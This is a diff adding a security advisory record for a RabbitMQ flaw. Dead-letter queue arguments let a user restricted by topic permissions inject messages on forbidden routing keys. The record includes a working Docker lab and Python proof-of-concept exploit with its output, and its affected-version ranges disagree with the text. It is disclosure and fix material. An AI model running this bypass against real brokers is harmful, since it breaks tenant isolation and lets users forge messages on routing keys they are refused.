@@ -1,0 +1,135 @@
+{
+  "modified": "2026-11-27T07:04:03Z",
+  "published": "2026-11-27T07:04:03Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-8c56-38wg-g99q",
+  "details": "### Summary\r\n\r\n`queue.declare` checks only resource-level `write` permission on `x-dead-letter-exchange`. It does not check `x-dead-letter-routing-key` against the declaring user's topic permissions. `rabbit_dead_letter:publish/5` then routes the dead-lettered message with broker authority and performs no authorization check.\r\n\r\nAn authenticated user whose topic write pattern is `^public\\..*$` can declare a queue with `x-dead-letter-exchange=amq.topic`, `x-dead-letter-routing-key=admin.secret`, and `x-message-ttl=0`. A message published to that queue expires immediately and is delivered on `amq.topic` with routing key `admin.secret`. A direct `basic.publish` of that key returns `403 ACCESS_REFUSED`.\r\n\r\nAffected versions are `\u003e= 3.7.0, \u003c= 4.4.0`, plus current `main` (`d38028c9c3`). Retested on 2026-10-31 with the official `rabbitmq:4.4.0-management` image (`rabbitmqctl version` reported `4.4.0`). No management tag is required.\r\n\r\n\r\n### Details\r\n\r\nTopic permissions, added in 3.7.0, are the routing-key authorization layer on a topic exchange. Publishing goes through both the resource `write` check and `check_topic_authorisation/5`. Dead lettering does not.\r\n\r\nOn `v4.4.0`, `deps/rabbit/src/rabbit_channel.erl:2593` handles `x-dead-letter-exchange` by calling `check_read_permitted/3` on the queue and `check_write_permitted/3` on the DLX exchange. It never calls `check_topic_authorisation/5` for `x-dead-letter-routing-key`. On `main` (`d38028c9c3`) the same branch is at `deps/rabbit/src/rabbit_channel.erl:2661-2664`.\r\n\r\n`deps/rabbit/src/rabbit_dead_letter.erl` `publish/5` (lines 30-47 on `main`) replaces the routing keys with the configured dead-letter routing key, then calls `rabbit_exchange:route/3` and `rabbit_queue_type:deliver/4` with no access check. The quorum at-least-once path in `deps/rabbit/src/rabbit_fifo_dlx_worker.erl` does the same.\r\n\r\nQueue arguments take precedence over policy for both `dead-letter-exchange` and `dead-letter-routing-key` (`queue_arg_has_precedence/2` and classic `res_arg/2`). The DLX documentation states the same override. An operator policy cannot pin a safe routing key if the user can declare the queue.\r\n\r\nThis is a vulnerability because topic permissions are the control that limits which routing keys a user may cause to be published on a shared topic exchange. The declaration-time DLX check already treats that configuration as a publish authorization, but it implements only the resource half of the check. Direct publish and bind still enforce the topic pattern, so the DLX path is an inconsistent hole in that boundary.\r\n\r\nPreconditions:\r\n\r\n- An authenticated AMQP user with `configure` on the queue and resource `write` on the topic exchange. `read` on the queue is also required by the existing DLX check.\r\n- Topic permissions are configured for that exchange. If none are set, the default backend allows every routing key and there is nothing to bypass.\r\n- The AMQP port is reachable (5672, or 5671 for TLS).\r\n\r\nNot required: a management tag, Management API access by the attacker, another user's credentials, or Erlang distribution access. The Management API in the proof of concept is used only by the administrator to create the fixture and read the result.\r\n\r\nEnvironment: official Docker image `rabbitmq:4.4.0-management`, unmodified broker, Linux container, Erlang and OS versions bundled in that image. An earlier run used `rabbitmq:4-management` and still saw the issue in 4.3.2. The image does not enable a custom authorization backend.\r\n\r\nSuggested fix: when the dead-letter exchange is a topic exchange, call `check_topic_authorisation` for `x-dead-letter-routing-key` at declaration time, using the declaring user and `write`. If that argument is absent, the original routing keys are reused, so those keys need the same check when the message is dead-lettered or the declaration must be limited to exchanges where that reuse is safe. Apply the same check on the AMQP 1.0 and HTTP declaration paths.\r\n\r\nWorkaround: do not grant `configure` on queues to a user who is restricted by topic permissions on an exchange they can write. A DLX policy does not close this, because queue arguments override the policy.\r\n\r\n### Proof of concept\r\n\r\nTested on 2026-10-31 against `rabbitmq:4.4.0-management`. Direct publish to `public.ok` was accepted. Direct publish to `admin.secret` returned `403 ACCESS_REFUSED - write access to topic 'admin.secret' in exchange 'amq.topic' in vhost '/' refused for user 'restricted'`. After the DLX queue expired the message, `secret-queue` contained payload `TOPIC_PERMISSION_BYPASSED_VIA_DLX` with routing key `admin.secret` and exchange `amq.topic`. Binding `admin.secret` was still `403`. The restricted user had an empty management tag in that run. The script below sets `tags` to `management`; that tag is not used and is not required.\r\n\r\nSave `poc.py` next to this Compose file and run `docker compose up --abort-on-container-exit`.\r\n\r\n```yaml\r\nnetworks:\r\n  vuln04-net:\r\n    driver: bridge\r\n\r\nservices:\r\n  target:\r\n    image: rabbitmq:4.4.0-management\r\n    container_name: vuln04-target\r\n    hostname: vuln04-target\r\n    environment:\r\n      RABBITMQ_DEFAULT_USER: admin\r\n      RABBITMQ_DEFAULT_PASS: admin123\r\n    networks:\r\n      - vuln04-net\r\n    healthcheck:\r\n      test: [\"CMD\", \"rabbitmq-diagnostics\", \"check_running\", \"-q\"]\r\n      interval: 10s\r\n      timeout: 10s\r\n      retries: 5\r\n\r\n  attacker:\r\n    image: python:3.11-slim\r\n    container_name: vuln04-attacker\r\n    command: \u003e\r\n      bash -c \"pip install -q pika requests \u0026\u0026 python3 /poc/poc.py vuln04-target \u0026\u0026 echo '\u003e\u003e\u003e TEST COMPLETE'\"\r\n    volumes:\r\n      - ./poc.py:/poc/poc.py:ro\r\n    networks:\r\n      - vuln04-net\r\n    depends_on:\r\n      target:\r\n        condition: service_healthy\r\n```\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"PoC: DLX Topic Permission Bypass\"\"\"\r\nimport pika, requests, time, sys\r\n\r\nTARGET = sys.argv[1] if len(sys.argv) \u003e 1 else \"vuln04-target\"\r\nAPI = f\"http://{TARGET}:15672/api\"\r\nADMIN = (\"admin\",\"admin123\")\r\n\r\nrequests.put(f\"{API}/users/restricted\", auth=ADMIN,\r\n    json={\"password\":\"rest123\",\"tags\":\"management\"})\r\nrequests.put(f\"{API}/permissions/%2F/restricted\", auth=ADMIN,\r\n    json={\"configure\":\".*\",\"write\":\".*\",\"read\":\".*\"})\r\nrequests.put(f\"{API}/topic-permissions/%2F/restricted/amq.topic\", auth=ADMIN,\r\n    json={\"exchange\":\"amq.topic\",\"write\":\"^public\\\\\\\\..*$\",\"read\":\"^public\\\\\\\\..*$\"})\r\n\r\nrequests.put(f\"{API}/queues/%2F/secret-queue\", auth=ADMIN, json={\"durable\":True})\r\nrequests.post(f\"{API}/bindings/%2F/e/amq.topic/q/secret-queue\", auth=ADMIN,\r\n    json={\"routing_key\":\"admin.secret\"})\r\n\r\ncreds = pika.PlainCredentials('restricted','rest123')\r\nconn = pika.BlockingConnection(pika.ConnectionParameters(host=TARGET, credentials=creds))\r\nch = conn.channel()\r\ntry:\r\n    ch.confirm_delivery()\r\n    ch.basic_publish(exchange='amq.topic', routing_key='admin.secret', body='direct')\r\n    print(\"[Test 1] Direct publish: UNEXPECTED SUCCESS\")\r\nexcept pika.exceptions.ChannelClosedByBroker as e:\r\n    print(\"[Test 1] Direct publish: BLOCKED (ACCESS_REFUSED)\")\r\n    conn = pika.BlockingConnection(pika.ConnectionParameters(host=TARGET, credentials=creds))\r\n    ch = conn.channel()\r\n\r\nch.queue_declare(queue='dlx-bypass', durable=True, arguments={\r\n    'x-dead-letter-exchange': 'amq.topic',\r\n    'x-dead-letter-routing-key': 'admin.secret',\r\n    'x-message-ttl': 0\r\n})\r\nch.basic_publish(exchange='', routing_key='dlx-bypass',\r\n    body='TOPIC_PERMISSION_BYPASSED_VIA_DLX')\r\nconn.close()\r\ntime.sleep(2)\r\n\r\nr = requests.post(f\"{API}/queues/%2F/secret-queue/get\", auth=ADMIN,\r\n    json={\"count\":5,\"ackmode\":\"ack_requeue_false\",\"encoding\":\"auto\"})\r\nmsgs = r.json()\r\nif msgs:\r\n    for m in msgs:\r\n        print(f\"[VULNERABLE] Message in secret-queue: routing_key={m['routing_key']}, \"\r\n              f\"payload={m['payload']}\")\r\nelse:\r\n    print(\"[SAFE] secret-queue is empty\")\r\n\r\nrequests.delete(f\"{API}/queues/%2F/dlx-bypass\", auth=ADMIN)\r\nrequests.delete(f\"{API}/queues/%2F/secret-queue\", auth=ADMIN)\r\nrequests.delete(f\"{API}/users/restricted\", auth=ADMIN)\r\n```\r\nObserved on the 4.4.0 run:\r\n\r\n```\r\n[Test 1] Direct publish to admin.secret\r\n  Result: BLOCKED\r\n  Error: ACCESS_REFUSED - write access to topic 'admin.secret' in exchange\r\n         'amq.topic' in vhost '/' refused for user 'restricted'\r\n\r\n[Test 2] Via DLX (x-dead-letter-routing-key=admin.secret, x-message-ttl=0)\r\n  Message sent (TTL=0 -\u003e instant DLX)\r\n\r\n[Verify] secret-queue:\r\n  [VULNERABLE] Message arrived!\r\n    routing_key: admin.secret\r\n    payload: TOPIC_PERMISSION_BYPASSED_VIA_DLX\r\n    exchange: amq.topic\r\n```\r\n\r\nA positive control, direct publish of `public.ok`, was accepted and arrived on a queue bound to that key. That shows the stored pattern is `^public\\..*$`, not a pattern that denies every key.\r\n\r\n\r\n\r\n### Impact\r\n\r\nA user who is allowed to declare a queue and write to a topic exchange can inject messages onto routing keys outside their topic write pattern. In a multi-tenant topic exchange, that is a cross-tenant integrity failure. `x-message-ttl=0` makes it immediate. Any AMQP client that can declare a queue can do it.\r\n\r\nThe user still cannot bind or consume the forbidden key, so topic read authorization holds. Availability is not directly affected.\r\n\r\nThere is no patched version. Please keep this private until a patch release and CVE are ready. I can retest a fix. Please credit vulscan.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.4.0"
+            },
+            {
+              "fixed": "4.4.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.3.0"
+            },
+            {
+              "fixed": "4.3.8"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.2.0"
+            },
+            {
+              "fixed": "4.2.13"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.1.0"
+            },
+            {
+              "fixed": "4.1.18"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.13.0"
+            },
+            {
+              "fixed": "3.13.22"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-8c56-38wg-g99q"
+    }
+  ]
+}
